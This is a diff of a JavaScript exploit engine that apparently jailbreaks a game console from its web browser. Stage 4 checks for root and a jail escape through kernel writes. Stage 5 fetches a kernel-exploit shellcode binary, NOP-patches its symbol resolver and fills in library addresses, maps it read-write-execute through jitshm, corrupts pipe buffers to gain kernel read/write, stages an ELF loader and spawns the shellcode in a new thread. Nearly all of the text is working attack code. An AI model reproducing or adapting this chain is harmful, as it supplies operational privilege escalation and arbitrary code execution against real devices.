-      return out;
+      out.why = "cr_uid reads " + uid1.v + " after being written 0"; return out;
     }
     if (!dirOk) {
-      out.why =
-        "fd_rdir/fd_jdir did not read back as rootvnode " +
-        hx(rv.rootvnode) +
-        " (got " +
-        hx(rdir.v) +
-        " / " +
-        hx(jdir.v) +
-        "); uid 0 but still jailed";
+      out.why = "fd_rdir/fd_jdir did not read back as rootvnode " + hx(rv.rootvnode)
+        + " (got " + hx(rdir.v) + " / " + hx(jdir.v) + "); uid 0 but still jailed";
       return out;
     }
 
@@ -8037,60 +7648,10 @@ export function makePoopsEngine(X) {
     S.jailbroken = true;
     out.ok = true;
     out.authOk = authOk;
-    flushMark(
-      "STAGE4-DONE",
-      "uid=0-getuid=0-rdir=jdir=rootvnode" +
-        "-authid=" +
-        hx(auth.v) +
-        "-authOk=" +
-        authOk +
-        "-kernelWrites=" +
-        S.kernelWrites,
-    );
+    flushMark("STAGE4-DONE", "uid=0-getuid=0-rdir=jdir=rootvnode"
+      + "-authid=" + hx(auth.v) + "-authOk=" + authOk
+      + "-kernelWrites=" + S.kernelWrites,);
     return out;
-  }
-
-  async function dlsymRaw(handle, name) {
-    const b = S.buf;
-    const nb = b.dlsymName,
-      ob = b.dlsymOut,
-      rb = b.dlsymRet;
-    for (let i = 0; i < nb.bytes; ++i) nb.u8[i] = 0;
-    for (let i = 0; i < name.length && i < nb.bytes - 1; ++i)
-      nb.u8[i] = name.charCodeAt(i) & 0xff;
-    w64(ob.u8, 0, i64(0, 0));
-    w64(rb.u8, 0, i64(0, 0));
-
-    if (typeof OFFSET_lk_sceKernelDlsym !== "number")
-      throw new Error("this firmware profile has no native sceKernelDlsym offset");
-
-    // Use the native browser-libkernel wrapper, not raw syscall 591.  The
-    // wrapper owns the firmware ABI and translates errno into an SCE result.
-    const fn = P.libKernelBase.add32(OFFSET_lk_sceKernelDlsym);
-    await runBuilt("sceKernelDlsym:" + name, () => {
-      emitCallAddr(fn, rb.base, handle, nb.base, ob.base);
-    });
-    const s32 = r32(rb.u8, 0) | 0;
-    const r = {
-      s32: s32,
-      failed: s32 !== 0,
-      errText:
-        s32 === 0
-          ? "ok"
-          : "sceKernelDlsym=0x" + (s32 >>> 0).toString(16),
-    };
-    return { r: r, out: r64(ob.u8, 0) };
-  }
-
-  async function dlsym(handle, name) {
-    const raw = await dlsymRaw(handle, name);
-    const r = raw.r,
-      ob = S.buf.dlsymOut;
-    if (r.failed) return { ok: false, raw: raw, why: name + ": " + r.errText };
-    const v = r64(ob.u8, 0);
-    if (!isKernelPtr(v) && isZero64(v))
-      return { ok: false, why: name + " resolved to 0" };
-    return { ok: true, addr: v };
   }
 
   async function findAllproc() {
@@ -8181,20 +7742,17 @@ export function makePoopsEngine(X) {
     const r = await fetch(url, { cache: "no-store" });
     if (!r.ok) throw new Error("HTTP " + r.status);
     if (!r.body || typeof r.body.getReader !== "function") {
-      const buf = new Uint8Array(await r.arrayBuffer());
-      sink(0, buf);
+      const buf = new Uint8Array(await r.arrayBuffer()); sink(0, buf);
       return { total: buf.length, streamed: false, head: buf.slice(0, 4) };
     }
     const reader = r.body.getReader();
-    let off = 0,
-      head = null;
+    let off = 0, head = null;
     for (;;) {
       const { done, value } = await reader.read();
       if (done) break;
       if (!value || !value.length) continue;
       if (head === null) head = value.slice(0, 4);
-      sink(off, value);
-      off += value.length;
+      sink(off, value); off += value.length;
     }
     return { total: off, streamed: true, head: head || new Uint8Array(0) };
   }
@@ -8207,23 +7765,16 @@ export function makePoopsEngine(X) {
       const i = g.indexOf(buf.u8);
       if (i < 0) return false;
       g.splice(i, 1);
-      queueEvent(
-        "ARENA-UNPINNED",
-        buf.label + "-bytes=" + buf.bytes + "-why=" + why,
-      );
+      queueEvent("ARENA-UNPINNED",
+        buf.label + "-bytes=" + buf.bytes + "-why=" + why,);
       return true;
-    } catch {
-      return false;
-    }
+    } catch { return false; }
   }
 
   async function stage5(opts) {
     const wasRace = setRaceMode(false);
-    try {
-      return await stage5Body(opts);
-    } finally {
-      setRaceMode(wasRace);
-    }
+    try { return await stage5Body(opts); }
+    finally { setRaceMode(wasRace); }
   }
 
   async function stage5Body(opts) {
@@ -8231,24 +7782,18 @@ export function makePoopsEngine(X) {
     const out = { ok: false, why: "", steps: [], ran: false };
 
     flushMark(
-      "STAGE5-ENTER",
-      "dryRun=" + !!o.dryRun + "-jailbroken=" + S.jailbroken,
+      "STAGE5-ENTER", "dryRun=" + !!o.dryRun + "-jailbroken=" + S.jailbroken,
     );
     if (!S.jailbroken) {
       out.why = "stage 4 jailbreak not proved by getuid()";
       return out;
     }
 
-    // This loader path has no dlsym dependency.  The selected firmware
-    // profile supplies the two libkernel entry points used below; mapping and
-    // allocation are direct syscalls from the profile's syscall table.
     out.dlsym = { skipped: true, reason: "profile offsets + direct syscalls" };
     flushMark(
-      "STAGE5-NO-DLSYM",
-      "pthreadCreateOff=0x" +
+      "STAGE5-NO-DLSYM", "pthreadCreateOff=0x" +
         (PK.LK_PTHREAD_CREATE_NAME_NP >>> 0).toString(16) +
-        "-pthreadJoinOff=0x" +
-        (PK.LK_PTHREAD_JOIN >>> 0).toString(16),
+        "-pthreadJoinOff=0x" + (PK.LK_PTHREAD_JOIN >>> 0).toString(16),
     );
     if (PK.LK_PTHREAD_CREATE_NAME_NP < 0 || PK.LK_PTHREAD_JOIN < 0) {
       out.why = "selected firmware profile has no pthread create/join offsets";
@@ -8256,9 +7801,7 @@ export function makePoopsEngine(X) {
     }
 
     let binBytes = null;
-    let elfBase = null,
-      elfLen = 0,
-      elfMapped = 0;
+    let elfBase = null, elfLen = 0, elfMapped = 0;
 
     flushMark(
       "STAGE5-FETCH-BIN-PRE",
@@ -8268,25 +7811,20 @@ export function makePoopsEngine(X) {
       const parts = [];
       const g = await fetchInto(
         "../payloads/" + (o.binName || "kexp_2026_05_25.bin"),
-        (off, chunk) => {
-          parts.push(chunk);
-        },
+        (off, chunk) => { parts.push(chunk); },
       );
       binBytes = new Uint8Array(g.total);
       let at = 0;
       for (const c of parts) {
-        binBytes.set(c, at);
-        at += c.length;
+        binBytes.set(c, at); at += c.length;
       }
       out.steps.push(
-        "shellcode " +
-          g.total +
-          " bytes" +
+        "shellcode " + g.total + " bytes" +
           (g.streamed ? " (streamed)" : " (buffered)"),
       );
     } catch (err) {
-      out.why =
-        "could not fetch the shellcode: " + String((err && err.message) || err);
+      out.why = "could not fetch the shellcode: " +
+        String((err && err.message) || err);
       return out;
     }
     if (!binBytes.length) {
@@ -8308,29 +7846,20 @@ export function makePoopsEngine(X) {
       if (!(declared >= 4 && declared <= 0x1000000))
         throw new Error("invalid elfldr size " + declared);
       if (
-        elfBytes[0] !== 0x7f ||
-        elfBytes[1] !== 0x45 ||
-        elfBytes[2] !== 0x4c ||
-        elfBytes[3] !== 0x46
+        elfBytes[0] !== 0x7f || elfBytes[1] !== 0x45 ||
+        elfBytes[2] !== 0x4c || elfBytes[3] !== 0x46
       )
         throw new Error("does not start with \x7fELF");
       flushMark("STAGE5-ELF-FETCH-OK", "bytes=" + declared);
       const mapped = (declared + PK.PAGE - 1) & ~(PK.PAGE - 1);
       const er = await sys(
-        PSYS.MMAP,
-        i64(0, 0),
-        mapped,
-        PK.PROT_RW,
-        PK.MAP_ANON_PRIVATE,
-        -1,
-        i64(0, 0),
+        PSYS.MMAP, i64(0, 0), mapped, PK.PROT_RW,
+        PK.MAP_ANON_PRIVATE, -1, i64(0, 0),
       );
       if (er.failed || isZero64(er.raw))
         throw new Error(
-          "anonymous mmap of 0x" +
-            mapped.toString(16) +
-            " failed: " +
-            er.errText,
+          "anonymous mmap of 0x" + mapped.toString(16) +
+            " failed: " + er.errText,
         );
       elfBase = er.raw;
       elfMapped = mapped;
@@ -8342,69 +7871,45 @@ export function makePoopsEngine(X) {
       const n4 = elfBytes.length & ~3;
       for (; i < n4; i += 4)
         P.write4(
-          elfBase.add32(i),
-          elfBytes[i] |
-            (elfBytes[i + 1] << 8) |
-            (elfBytes[i + 2] << 16) |
-            (elfBytes[i + 3] << 24),
+          elfBase.add32(i), elfBytes[i] | (elfBytes[i + 1] << 8) |
+            (elfBytes[i + 2] << 16) | (elfBytes[i + 3] << 24),
         );
       for (; i < elfBytes.length; ++i)
         P.write1(elfBase.add32(i), elfBytes[i]);
       elfLen = elfBytes.length;
       const back = P.read4(elfBase);
       out.steps.push(
-        "elfldr @ " +
-          hx(elfBase) +
-          " size 0x" +
-          elfLen.toString(16) +
-          " in anon mmap 0x" +
-          mapped.toString(16) +
-          "; first dword reads back 0x" +
-          (back >>> 0).toString(16),
+        "elfldr @ " + hx(elfBase) + " size 0x" + elfLen.toString(16) +
+          " in anon mmap 0x" + mapped.toString(16) +
+          "; first dword reads back 0x" + (back >>> 0).toString(16),
       );
     } catch (err) {
-      out.why =
-        "could not stage the elfldr: " + String((err && err.message) || err);
+      out.why = "could not stage the elfldr: " +
+        String((err && err.message) || err);
       return out;
     }
 
     flushMark(
-      "STAGE5-STAGED",
-      "bin=" +
-        (binBytes ? binBytes.length : -1) +
-        "-elf=" +
-        elfLen +
-        "-elfAt=" +
-        hx(elfBase) +
-        "-mapped=0x" +
+      "STAGE5-STAGED", "bin=" + (binBytes ? binBytes.length : -1) +
+        "-elf=" + elfLen + "-elfAt=" + hx(elfBase) + "-mapped=0x" +
         elfMapped.toString(16),
     );
 
     const ap = await getAllproc();
     if (!ap.ok) {
-      out.why = "allproc " + ap.why;
-      return out;
+      out.why = "allproc " + ap.why; return out;
     }
     const allproc = ap.addr;
-    out.steps.push(
-      "allproc = " +
-        hx(allproc) +
-        (ap.cached ? " (proven in stage 4)" : " (proven here)"),
-    );
-    flushMark(
-      "STAGE5-ALLPROC",
-      "allproc=" + hx(allproc) + "-cached=" + !!ap.cached,
-    );
+    out.steps.push("allproc = " + hx(allproc) +
+      (ap.cached ? " (proven in stage 4)" : " (proven here)"),);
+    flushMark("STAGE5-ALLPROC",
+      "allproc=" + hx(allproc) + "-cached=" + !!ap.cached,);
 
-    // This exact kexp resolves 11 functions through syscall 0x24f and executes
-    // UD2 if any lookup fails.  WebProcess 09.00 rejects that internal resolver.
-    // Fill its PIC slots from the exact firmware profile and skip the resolver.
     const resolverCallA = [0xe8, 0xcf, 0x00, 0x00, 0x00];
     const resolverCallB = [0xe8, 0x78, 0x01, 0x00, 0x00];
     const getpidBlock = [
       0x48, 0x8d, 0x35, 0xac, 0x30, 0x00, 0x00,
-      0x48, 0x8d, 0x55, 0xd0,
-      0xbf, 0x01, 0x20, 0x00, 0x00,
+      0x48, 0x8d, 0x55, 0xd0, 0xbf, 0x01, 0x20, 0x00, 0x00,
       0xe8, 0x41, 0x2b, 0x00, 0x00,
     ];
     const bytesAt = (off, expected) =>
@@ -8416,100 +7921,65 @@ export function makePoopsEngine(X) {
       PK.LK_GETPID,
     ];
     if (
-      binBytes.length !== 18912 ||
-      !bytesAt(0x1c, resolverCallA) ||
-      !bytesAt(0x23, resolverCallB) ||
-      !bytesAt(0x10f1, getpidBlock) ||
+      binBytes.length !== 18912 || !bytesAt(0x1c, resolverCallA) ||
+      !bytesAt(0x23, resolverCallB) || !bytesAt(0x10f1, getpidBlock) ||
       requiredResolverOffsets.some((off) => off < 0)
     ) {
-      out.why = "payload resolver bypass signature/profile check failed";
-      return out;
+      out.why = "payload resolver bypass signature/profile check failed"; return out;
     }
 
     for (let i = 0; i < 5; ++i) {
-      binBytes[0x1c + i] = 0x90;
-      binBytes[0x23 + i] = 0x90;
+      binBytes[0x1c + i] = 0x90; binBytes[0x23 + i] = 0x90;
     }
     const resolvedSlots = [
-      [0x48b0, P.libKernelBase.add32(PK.LK_NOTIFY)],
-      [0x48b8, P.libKernelBase.add32(PK.LK_SYSCTLBYNAME)],
-      [0x48c0, P.libKernelBase.add32(PK.LK_PTHREAD_CREATE)],
-      [0x48c8, P.libKernelBase.add32(PK.LK_PTHREAD_JOIN)],
-      [0x48d0, P.libSceLibcInternalBase.add32(PK.LC_MALLOC)],
-      [0x48d8, P.libSceLibcInternalBase.add32(PK.LC_FREE)],
-      [0x48e0, P.libSceLibcInternalBase.add32(PK.LC_MEMCPY)],
-      [0x48e8, P.libSceLibcInternalBase.add32(PK.LC_MEMSET)],
-      [0x48f0, P.libSceLibcInternalBase.add32(PK.LC_STRCMP)],
-      [0x48f8, P.libSceLibcInternalBase.add32(PK.LC_MEMCMP)],
+      [0x48b0, P.libKernelBase.add32(PK.LK_NOTIFY)], [0x48b8, P.libKernelBase.add32(PK.LK_SYSCTLBYNAME)],
+      [0x48c0, P.libKernelBase.add32(PK.LK_PTHREAD_CREATE)], [0x48c8, P.libKernelBase.add32(PK.LK_PTHREAD_JOIN)],
+      [0x48d0, P.libSceLibcInternalBase.add32(PK.LC_MALLOC)], [0x48d8, P.libSceLibcInternalBase.add32(PK.LC_FREE)],
+      [0x48e0, P.libSceLibcInternalBase.add32(PK.LC_MEMCPY)], [0x48e8, P.libSceLibcInternalBase.add32(PK.LC_MEMSET)],
+      [0x48f0, P.libSceLibcInternalBase.add32(PK.LC_STRCMP)], [0x48f8, P.libSceLibcInternalBase.add32(PK.LC_MEMCMP)],
       [0x4900, P.libSceLibcInternalBase.add32(PK.LC_VSNPRINTF)],
     ];
     for (const [slot, address] of resolvedSlots) w64(binBytes, slot, address);
 
     const getpidAddress = P.libKernelBase.add32(PK.LK_GETPID);
-    binBytes[0x10f1] = 0x48;
-    binBytes[0x10f2] = 0xb8;
+    binBytes[0x10f1] = 0x48; binBytes[0x10f2] = 0xb8;
     w64(binBytes, 0x10f3, getpidAddress);
     const getpidTail = [0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0];
     for (let i = 0; i < getpidTail.length; ++i)
       binBytes[0x10fb + i] = getpidTail[i];
     for (let i = 0x1101; i < 0x1106; ++i) binBytes[i] = 0x90;
-    flushMark(
-      "STAGE5-RESOLVER-BYPASS",
+    flushMark("STAGE5-RESOLVER-BYPASS",
       "payload=618f4b12-slots=11-getpid=" + hx(getpidAddress) +
-        "-dlsym-syscall-calls-skipped=12",
-    );
+        "-dlsym-syscall-calls-skipped=12",);
 
     const size = binBytes.length;
     const aligned = (size + PK.PAGE - 1) & ~(PK.PAGE - 1);
     const jr = await sys(PSYS.JITSHM_CREATE, 0, aligned, 0x7);
     if (jr.failed || jr.s32 < 0) {
-      out.why = "jitshm_create failed: " + jr.errText;
-      return out;
+      out.why = "jitshm_create failed: " + jr.errText; return out;
     }
     const execFd = jr.s32;
     track(execFd);
     const mr = await sys(
-      PSYS.MMAP,
-      i64(0, 0),
-      aligned,
-      PK.PROT_RWX,
-      PK.MAP_SHARED,
-      execFd,
-      i64(0, 0),
+      PSYS.MMAP, i64(0, 0), aligned, PK.PROT_RWX,
+      PK.MAP_SHARED, execFd, i64(0, 0),
     );
     if (mr.failed || isZero64(mr.raw)) {
       out.why = "mmap(PROT_RWX, MAP_SHARED, jitshm fd) failed: " + mr.errText;
       return out;
     }
     const entry = mr.raw;
-    out.steps.push(
-      "shellcode mapped RWX @ " +
-        hx(entry) +
-        " size 0x" +
-        aligned.toString(16) +
-        " via jitshm fd " +
-        execFd,
-    );
-    flushMark(
-      "STAGE5-MAP",
-      "entry=" +
-        hx(entry) +
-        "-size=0x" +
-        aligned.toString(16) +
-        "-jitfd=" +
-        execFd,
-    );
+    out.steps.push("shellcode mapped RWX @ " + hx(entry) + " size 0x" +
+      aligned.toString(16) + " via jitshm fd " + execFd,);
+    flushMark("STAGE5-MAP", "entry=" + hx(entry) + "-size=0x" +
+      aligned.toString(16) + "-jitfd=" + execFd,);
 
     const expectDword = (off) =>
-      (binBytes[off] |
-        (binBytes[off + 1] << 8) |
-        (binBytes[off + 2] << 16) |
-        (binBytes[off + 3] << 24)) >>>
-      0;
+      (binBytes[off] | (binBytes[off + 1] << 8) |
+        (binBytes[off + 2] << 16) | (binBytes[off + 3] << 24)) >>> 0;
     function writeAndVerify(dst) {
       for (let i = 0; i < size; ++i) P.write1(dst.add32(i), binBytes[i]);
-      let bad = 0,
-        firstBad = -1;
+      let bad = 0, firstBad = -1;
       for (let off = 0; off + 4 <= size; off += 4) {
         if (P.read4(dst.add32(off)) >>> 0 !== expectDword(off)) {
           if (firstBad < 0) firstBad = off;
@@ -8520,94 +7990,49 @@ export function makePoopsEngine(X) {
     }
 
     let v = writeAndVerify(entry);
-    flushMark(
-      "STAGE5-SHELLCODE-VERIFY",
-      "at=" +
-        hx(entry) +
-        "-first=0x" +
-        v.first.toString(16) +
-        "-expect=0x" +
-        expectDword(0).toString(16) +
-        "-badDwords=" +
-        v.bad +
-        "-of-" +
-        (size >> 2) +
-        "-firstBad=" +
-        v.firstBad,
-    );
+    flushMark("STAGE5-SHELLCODE-VERIFY", "at=" + hx(entry) +
+      "-first=0x" + v.first.toString(16) + "-expect=0x" +
+      expectDword(0).toString(16) + "-badDwords=" + v.bad + "-of-" +
+      (size >> 2) + "-firstBad=" + v.firstBad,);
 
     if (v.bad !== 0) {
       const ar = await sys(PSYS.JITSHM_ALIAS, execFd, PK.PROT_RW);
       if (ar.failed || ar.s32 < 0) {
-        out.why =
-          "RWX write did not land (" +
-          v.bad +
-          " of " +
-          (size >> 2) +
-          " dwords wrong, first at " +
-          v.firstBad +
-          ") and jitshm_alias failed: " +
-          ar.errText;
+        out.why = "RWX write did not land (" + v.bad + " of " + (size >> 2) +
+          " dwords wrong, first at " + v.firstBad +
+          ") and jitshm_alias failed: " + ar.errText;
         return out;
       }
       const wFd = ar.s32;
       track(wFd);
       const wm = await sys(
-        PSYS.MMAP,
-        i64(0, 0),
-        aligned,
-        PK.PROT_RW,
-        PK.MAP_SHARED,
-        wFd,
-        i64(0, 0),
+        PSYS.MMAP, i64(0, 0), aligned, PK.PROT_RW,
+        PK.MAP_SHARED, wFd, i64(0, 0),
       );
       if (wm.failed || isZero64(wm.raw)) {
-        out.why =
-          "jitshm_alias fd " + wFd + " gave no writable mapping: " + wm.errText;
+        out.why = "jitshm_alias fd " + wFd +
+          " gave no writable mapping: " + wm.errText;
         return out;
       }
       const wAddr = wm.raw;
-      flushMark(
-        "STAGE5-ALIAS",
-        "wfd=" +
-          wFd +
-          "-writeAt=" +
-          hx(wAddr) +
-          "-execAt=" +
-          hx(entry) +
-          "-direct-RWX-write-did-not-land",
-      );
+      flushMark("STAGE5-ALIAS", "wfd=" + wFd + "-writeAt=" + hx(wAddr) +
+        "-execAt=" + hx(entry) + "-direct-RWX-write-did-not-land",);
       v = writeAndVerify(wAddr);
 
       const execFirst = P.read4(entry) >>> 0;
-      flushMark(
-        "STAGE5-ALIAS-VERIFY",
-        "aliasBad=" +
-          v.bad +
-          "-execFirst=0x" +
-          execFirst.toString(16) +
-          "-expect=0x" +
-          expectDword(0).toString(16),
-      );
+      flushMark("STAGE5-ALIAS-VERIFY", "aliasBad=" + v.bad +
+        "-execFirst=0x" + execFirst.toString(16) + "-expect=0x" +
+        expectDword(0).toString(16),);
       if (v.bad !== 0 || execFirst !== expectDword(0)) {
-        out.why =
-          "alias write did not land (" +
-          v.bad +
-          " bad dwords; exec mapping reads 0x" +
-          execFirst.toString(16) +
-          ", wrote 0x" +
-          expectDword(0).toString(16) +
-          "); not spawning";
+        out.why = "alias write did not land (" + v.bad +
+          " bad dwords; exec mapping reads 0x" + execFirst.toString(16) +
+          ", wrote 0x" + expectDword(0).toString(16) + "); not spawning";
         return out;
       }
       await sys(PSYS.MUNMAP, wAddr, aligned);
     }
-    out.steps.push(
-      "shellcode written and verified at " +
-        hx(entry) +
-        "; first dword 0x" +
-        expectDword(0).toString(16),
-    );
+    out.steps.push("shellcode written and verified at " + hx(entry) +
+      "; first dword 0x" + expectDword(0).toString(16),);
 
     const lkb = P.libKernelBase;
     if (!lkb || isZero64(lkb)) {
@@ -8615,146 +8040,80 @@ export function makePoopsEngine(X) {
       return out;
     }
     const useSizedSceThread =
-      PK.LK_SCE_PTHREAD_CREATE >= 0 &&
-      PK.LK_SCE_PTHREAD_JOIN >= 0 &&
+      PK.LK_SCE_PTHREAD_CREATE >= 0 && PK.LK_SCE_PTHREAD_JOIN >= 0 &&
       PK.LK_SCE_PTHREAD_ATTR_INIT >= 0 &&
       PK.LK_SCE_PTHREAD_ATTR_SETSTACKSIZE >= 0 &&
       PK.LK_SCE_PTHREAD_ATTR_SETDETACHSTATE >= 0 &&
       PK.LK_SCE_PTHREAD_ATTR_DESTROY >= 0;
     const tc = {
-      addr: lkb.add32(
-        useSizedSceThread
-          ? PK.LK_SCE_PTHREAD_CREATE
-          : PK.LK_PTHREAD_CREATE_NAME_NP,
-      ),
+      addr: lkb.add32(useSizedSceThread ? PK.LK_SCE_PTHREAD_CREATE :
+        PK.LK_PTHREAD_CREATE_NAME_NP,),
     };
     const tj = {
       addr: lkb.add32(
-        useSizedSceThread ? PK.LK_SCE_PTHREAD_JOIN : PK.LK_PTHREAD_JOIN,
-      ),
+        useSizedSceThread ? PK.LK_SCE_PTHREAD_JOIN : PK.LK_PTHREAD_JOIN,),
     };
-    out.steps.push(
-      "libkernel=" +
-        hx(lkb) +
-        (useSizedSceThread ? " scePthreadCreate=" : " pthread_create_name_np=") +
-        hx(tc.addr) +
-        " pthread_join=" +
-        hx(tj.addr),
-    );
-    flushMark(
-      "STAGE5-PTHREAD",
-      "libkernel=" +
-        hx(lkb) +
-        "-create=" +
-        hx(tc.addr) +
-        "-join=" +
-        hx(tj.addr),
-    );
+    out.steps.push("libkernel=" + hx(lkb) +
+      (useSizedSceThread ? " scePthreadCreate=" : " pthread_create_name_np=") +
+      hx(tc.addr) + " pthread_join=" + hx(tj.addr),);
+    flushMark("STAGE5-PTHREAD", "libkernel=" + hx(lkb) +
+      "-create=" + hx(tc.addr) + "-join=" + hx(tj.addr),);
 
     const args = alloc(0x28, "stage5-shellcode-args");
-    w32(args.u8, 0x00, S.masterRfd);
-    w32(args.u8, 0x04, S.masterWfd);
-    w32(args.u8, 0x08, S.victimRfd);
-    w32(args.u8, 0x0c, S.victimWfd);
-    w64(args.u8, 0x10, allproc);
-    w64(args.u8, 0x18, elfBase);
+    w32(args.u8, 0x00, S.masterRfd); w32(args.u8, 0x04, S.masterWfd);
+    w32(args.u8, 0x08, S.victimRfd); w32(args.u8, 0x0c, S.victimWfd);
+    w64(args.u8, 0x10, allproc); w64(args.u8, 0x18, elfBase);
     w64(args.u8, 0x20, i64(elfLen, 0));
-    flushMark(
-      "STAGE5-ARGS",
-      "master=" +
-        S.masterRfd +
-        "." +
-        S.masterWfd +
-        "-victim=" +
-        S.victimRfd +
-        "." +
-        S.victimWfd +
-        "-allproc=" +
-        hx(allproc) +
-        "-elfldr=" +
-        hx(elfBase) +
-        "-size=0x" +
-        elfLen.toString(16),
-    );
+    flushMark("STAGE5-ARGS", "master=" + S.masterRfd + "." + S.masterWfd +
+      "-victim=" + S.victimRfd + "." + S.victimWfd +
+      "-allproc=" + hx(allproc) + "-elfldr=" + hx(elfBase) + "-size=0x" +
+      elfLen.toString(16),);
 
     if (o.dryRun) {
-      out.ok = true;
-      out.ran = false;
+      out.ok = true; out.ran = false;
 
       let freed = false;
       if (elfBase && elfMapped) {
         const ur = await sys(PSYS.MUNMAP, elfBase, elfMapped);
         freed = !ur.failed;
-        queueEvent(
-          "STAGE5-MUNMAP",
-          "addr=" +
-            hx(elfBase) +
-            "-size=0x" +
-            elfMapped.toString(16) +
-            "-ok=" +
-            freed +
-            "-why=dry-run-elfldr-never-handed-over",
-        );
+        queueEvent("STAGE5-MUNMAP", "addr=" + hx(elfBase) + "-size=0x" +
+          elfMapped.toString(16) + "-ok=" + freed +
+          "-why=dry-run-elfldr-never-handed-over",);
       }
       elfBase = null;
-      out.steps.push(
-        "dry run: prepared, thread not spawned" +
-          (freed ? ", elfldr mapping unmapped" : ""),
-      );
+      out.steps.push("dry run: prepared, thread not spawned" +
+        (freed ? ", elfldr mapping unmapped" : ""),);
       return out;
     }
 
     const handleBuf = alloc(8, "stage5-thr-handle");
     const retBuf = alloc(8, "stage5-thr-ret");
 
-    // kexp bootstraps its kernel r/w through master.buffer
     const pbPrep = alloc(PK.PIPEBUF_SIZE, "stage5-pipebuf-prep");
     const pbOut = pbPrep.u8;
-    w32(pbOut, 0x00, 0);
-    w32(pbOut, 0x04, 0);
-    w32(pbOut, 0x08, 0);
+    w32(pbOut, 0x00, 0); w32(pbOut, 0x04, 0); w32(pbOut, 0x08, 0);
     w32(pbOut, 0x0c, PK.PIPE_PAGE_SIZE);
     w64(pbOut, 0x10, S.victimPipeData);
     await kwriteFast(S.masterPipeData, pbPrep, PK.PIPEBUF_SIZE);
     const pbBack = await kreadRetry64(S.masterPipeData.add32(0x10));
     const pbHdr = await kreadRetry64(S.masterPipeData);
-    const pbOk =
-      pbBack.ret === 8 &&
+    const pbOk = pbBack.ret === 8 &&
       pbBack.v.low === S.victimPipeData.low &&
       pbBack.v.hi === S.victimPipeData.hi;
-    flushMark(
-      "STAGE5-PIPEBUF",
-      "master=" +
-        hx(S.masterPipeData) +
-        "-buffer=" +
-        hx(pbBack.v) +
-        "-wantVictim=" +
-        hx(S.victimPipeData) +
-        "-cntIn=" +
-        hx(pbHdr.v) +
-        "-ok=" +
-        pbOk,
-    );
+    flushMark("STAGE5-PIPEBUF", "master=" + hx(S.masterPipeData) +
+      "-buffer=" + hx(pbBack.v) + "-wantVictim=" + hx(S.victimPipeData) +
+      "-cntIn=" + hx(pbHdr.v) + "-ok=" + pbOk,);
     if (!pbOk) {
-      out.why =
-        "master pipebuf does not point at the victim pipe " +
-        "(buffer=" +
-        hx(pbBack.v) +
-        ", wanted " +
-        hx(S.victimPipeData) +
-        ")";
+      out.why = "master pipebuf does not point at the victim pipe " +
+        "(buffer=" + hx(pbBack.v) + ", wanted " + hx(S.victimPipeData) + ")";
       return out;
     }
 
-    const method =
-      o.spawn ||
-      (typeof window !== "undefined" && window.POOPS_SPAWN) ||
-      PK.STAGE5_SPAWN;
+    const method = o.spawn ||
+      (typeof window !== "undefined" && window.POOPS_SPAWN) || PK.STAGE5_SPAWN;
     out.spawn = method;
-    flushMark(
-      "STAGE5-SPAWN",
-      "entry=" + hx(entry) + "-args=" + hx(args.base) + "-via=" + method,
-    );
+    flushMark("STAGE5-SPAWN",
+      "entry=" + hx(entry) + "-args=" + hx(args.base) + "-via=" + method,);
 
     async function releaseElf() {
       if (!elfBase || !elfMapped) return false;
@@ -8771,101 +8130,58 @@ export function makePoopsEngine(X) {
 
       w64(scTls.u8, 0, scTls.base);
 
-      // a raw thread has no wrapper; kexp returns into this
       const exitStub = P.syscalls[PSYS.THR_EXIT];
       if (exitStub === undefined) {
-        out.why = "no thr_exit stub in the syscall map";
-        return out;
+        out.why = "no thr_exit stub in the syscall map"; return out;
       }
       for (let q = 1; q <= 16; ++q)
         w64(scStack.u8, PK.STAGE5_THR_STACK - q * 8, exitStub);
 
       const param = alloc(0x68, "stage5-thr-param");
-      w64(param.u8, 0x00, entry);
-      w64(param.u8, 0x08, args.base);
+      w64(param.u8, 0x00, entry); w64(param.u8, 0x08, args.base);
       w64(param.u8, 0x10, scStack.base);
       w64(param.u8, 0x18, i64(PK.STAGE5_THR_STACK, 0));
       w64(param.u8, 0x20, scTls.base);
       w64(param.u8, 0x28, i64(PK.STAGE5_THR_TLS, 0));
-      w64(param.u8, 0x30, tidBuf.base);
-      w64(param.u8, 0x38, ptidBuf.base);
+      w64(param.u8, 0x30, tidBuf.base); w64(param.u8, 0x38, ptidBuf.base);
 
-      flushMark(
-        "STAGE5-THRNEW-PRE",
-        "param=" +
-          hx(param.base) +
-          "-entry=" +
-          hx(entry) +
-          "-arg=" +
-          hx(args.base) +
-          "-stack=" +
-          hx(scStack.base) +
-          "-size=0x" +
-          PK.STAGE5_THR_STACK.toString(16) +
-          "-tls=" +
-          hx(scTls.base) +
-          "-retTo=" +
-          hx(exitStub),
-      );
+      flushMark("STAGE5-THRNEW-PRE", "param=" + hx(param.base) +
+        "-entry=" + hx(entry) + "-arg=" + hx(args.base) +
+        "-stack=" + hx(scStack.base) + "-size=0x" +
+        PK.STAGE5_THR_STACK.toString(16) + "-tls=" + hx(scTls.base) +
+        "-retTo=" + hx(exitStub),);
 
       const tr = await sys(PSYS.THR_NEW, param.base, 0x68);
       const tid = r64(tidBuf.u8, 0);
 
-      flushMark(
-        "STAGE5-CREATE-RET",
-        "ret=" +
-          tr.s32 +
-          "-failed=" +
-          tr.failed +
-          "-tid=" +
-          hx(tid) +
-          "-thr_new-RETURNED",
-      );
+      flushMark("STAGE5-CREATE-RET", "ret=" + tr.s32 +
+        "-failed=" + tr.failed + "-tid=" + hx(tid) + "-thr_new-RETURNED",);
       if (tr.failed || tr.s32 !== 0) {
-        out.why =
-          "thr_new failed: " +
-          tr.errText +
+        out.why = "thr_new failed: " + tr.errText +
           "; thread not created, shellcode did not run";
         return out;
       }
       out.ran = true;
       out.steps.push("thr_new spawned tid " + hx(tid));
 
-      let exited = false,
-        ticks = 0;
+      let exited = false, ticks = 0;
       for (; ticks < PK.STAGE5_WAIT_TICKS; ++ticks) {
         await new Promise((r) => setTimeout(r, PK.STAGE5_WAIT_MS));
         if (isZero64(r64(tidBuf.u8, 0))) {
-          exited = true;
-          break;
+          exited = true; break;
         }
       }
       const waited = (ticks + 1) * PK.STAGE5_WAIT_MS;
 
       const freed = exited ? await releaseElf() : false;
-      out.ok = true;
-      out.shellRet = "n/a (thr_new has no join)";
-      flushMark(
-        "STAGE5-DONE",
-        "spawn=thr_new-tid=" +
-          hx(tid) +
-          "-exited=" +
-          exited +
-          "-waitedMs=" +
-          waited +
-          "-elfldrUnmapped=" +
-          freed,
-      );
-      out.steps.push(
-        exited
-          ? "shellcode thread exited after " +
-              waited +
-              " ms" +
